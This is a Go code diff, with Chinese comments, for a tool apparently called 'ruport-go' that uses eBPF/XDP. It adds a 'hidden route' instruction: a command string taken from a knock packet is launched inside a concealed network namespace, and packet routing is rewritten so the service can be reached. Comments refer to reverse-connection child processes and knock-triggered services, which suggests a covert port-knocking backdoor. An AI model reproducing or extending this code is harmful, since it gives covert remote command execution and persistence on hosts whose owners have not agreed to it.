@@ -13,12 +13,14 @@ import (
 	"os/exec"
 	"path/filepath"
 	"strconv"
+	"strings"
 	"sync"
 	"syscall"
 
 	"github.com/cilium/ebpf"
 
 	"ruport-go/internal/bpf"
+	"ruport-go/internal/netnsx"
 )
 
 // procKey 对应原 FunctionNode 的 (cip, cport)，用于索引反弹子进程。
@@ -29,12 +31,40 @@ type procKey struct {
 
 // Controller 保存功能子进程信息，等价于原项目的 FunctionNode 链表。
 type Controller struct {
+	cfg Config
+
 	mu    sync.Mutex
 	procs map[procKey]int
+
+	// netns 隐藏路由（ins=0x05）的懒初始化状态与服务表
+	nsMu     sync.Mutex
+	ns       *netnsx.NS
+	hostIP   uint32
+	svcMu    sync.Mutex
+	services map[string]*exec.Cmd
 }
 
-func New() *Controller {
-	return &Controller{procs: make(map[procKey]int)}
+// Config 为 Controller 的初始化参数。
+type Config struct {
+	Ifindex     int           // 宿主出口网卡（取回包 SNAT 源 IP 用）
+	NetnsName   string        // 默认 ruport_ns
+	NetnsSubnet *net.IPNet    // 默认 10.0.0.0/24
+	NetnsPrewarm *netnsx.NS  // 启动参数 -N 已预热的命名空间（可选，避免重复 Ensure）
+}
+
+func New(cfg Config) *Controller {
+	if cfg.NetnsName == "" {
+		cfg.NetnsName = "ruport_ns"
+	}
+	if cfg.NetnsSubnet == nil {
+		_, cfg.NetnsSubnet, _ = net.ParseCIDR("10.0.0.0/24")
+	}
+	return &Controller{
+		cfg:      cfg,
+		procs:    make(map[procKey]int),
+		ns:       cfg.NetnsPrewarm,
+		services: make(map[string]*exec.Cmd),
+	}
 }
 
 // ntohs/ntohl 语义的字节序转换。
@@ -91,21 +121,124 @@ func (c *Controller) HandleRouter(msg *bpf.XdpMessage, routerMap *ebpf.Map) {
 			log.Print("the nativeport is needed.")
 			return
 		}
-		c.insertRouter(routerMap, key, msg)
+		c.insertRouter(routerMap, key, msg, 0, 0)
+	case 0x05:
+		// netns 隐藏路由：懒初始化 ns 与服务，表项携带 ns 地址（nativeip/hostip）
+		if msg.Nativeport == 0 {
+			log.Print("the nativeport is needed.")
+			return
+		}
+		nativeip, hostip, err := c.prepareNetnsRoute(extString(msg.Ext[:]))
+		if err != nil {
+			log.Printf("prepare netns route failed: %v", err)
+			return
+		}
+		c.insertRouter(routerMap, key, msg, nativeip, hostip)
 	case 0x02, 0x03:
-		c.insertRouter(routerMap, key, msg)
+		c.insertRouter(routerMap, key, msg, 0, 0)
 	}
 }
 
-func (c *Controller) insertRouter(routerMap *ebpf.Map, key uint64, msg *bpf.XdpMessage) {
+func (c *Controller) insertRouter(routerMap *ebpf.Map, key uint64, msg *bpf.XdpMessage, nativeip, hostip uint32) {
 	router := bpf.TcRouter{
 		Cip:        msg.Cip,
 		Cport:      msg.Cport,
 		Connport:   msg.Connport,
 		Nativeport: msg.Nativeport,
+		Nativeip:   nativeip,
+		Hostip:     hostip,
 	}
 	if err := routerMap.Update(key, &router, ebpf.UpdateAny); err != nil {
 		log.Printf("update router map failed: %v", err)
+	}
+}
+
+// prepareNetnsRoute 处理 ins=0x05：按需建立 netns、按需拉起服务（同命令
+// 去重复用），返回表项所需的 nativeip/hostip（网络序原始值）。
+// ext 为空表示不拉服务（ns 里可能已有服务在跑，由调用方自行管理）。
+func (c *Controller) prepareNetnsRoute(extCmd string) (uint32, uint32, error) {
+	ns, err := c.ensureNetns()
+	if err != nil {
+		return 0, 0, err
+	}
+	if extCmd != "" {
+		if err := c.ensureService(ns, extCmd); err != nil {
+			return 0, 0, fmt.Errorf("start service %q: %w", extCmd, err)
+		}
+	}
+	hostip, err := c.hostIPv4()
+	if err != nil {
+		return 0, 0, err
+	}
+	return binary.BigEndian.Uint32(ns.ServiceIP.To4()), hostip, nil
+}
+
+func (c *Controller) ensureNetns() (*netnsx.NS, error) {
+	c.nsMu.Lock()
+	defer c.nsMu.Unlock()
+	if c.ns != nil {
+		return c.ns, nil
+	}
+	ns, err := netnsx.Ensure(c.cfg.NetnsName, c.cfg.NetnsSubnet)
+	if err != nil {
+		return nil, err
+	}
+	c.ns = ns
+	return ns, nil
+}
+
+// hostIPv4 取宿主出口网卡第一个 IPv4 地址（缓存一次）。
+func (c *Controller) hostIPv4() (uint32, error) {
+	c.nsMu.Lock()
+	defer c.nsMu.Unlock()
+	if c.hostIP != 0 {
+		return c.hostIP, nil
+	}
+	iface, err := net.InterfaceByIndex(c.cfg.Ifindex)
+	if err != nil {
+		return 0, err
+	}
+	addrs, err := iface.Addrs()
+	if err != nil {
+		return 0, err
+	}
+	for _, a := range addrs {
+		if ipn, ok := a.(*net.IPNet); ok {
+			if ip4 := ipn.IP.To4(); ip4 != nil && !ip4.IsLoopback() {
+				c.hostIP = binary.BigEndian.Uint32(ip4)
+				return c.hostIP, nil
+			}
+		}
+	}
+	return 0, fmt.Errorf("no IPv4 address on interface index %d", c.cfg.Ifindex)
+}
+
+// ensureService 在 ns 内拉起服务；同命令字符串只起一个进程（去重复用）。
+func (c *Controller) ensureService(ns *netnsx.NS, cmdStr string) error {
+	c.svcMu.Lock()
+	defer c.svcMu.Unlock()
+	if _, ok := c.services[cmdStr]; ok {
+		return nil
+	}
+	cmd, err := netnsx.StartInNS(ns.Fd, strings.Fields(cmdStr))
+	if err != nil {
+		return err
+	}
+	c.services[cmdStr] = cmd
+	log.Printf("service in netns: pid %d (%s)", cmd.Process.Pid, cmdStr)
+	return nil
+}
+
+// Shutdown 结束所有由敲门指令拉起的 ns 内服务。
+// 删除路由（-d）不影响服务（设计决策：可复用，秒连）；ruport 退出时统一回收。
+func (c *Controller) Shutdown() {
+	c.svcMu.Lock()
+	defer c.svcMu.Unlock()
+	for cmdStr, p := range c.services {
+		if p.Process != nil {
+			_ = p.Process.Signal(syscall.SIGTERM)
+		}
+		delete(c.services, cmdStr)
 	}
 }
 
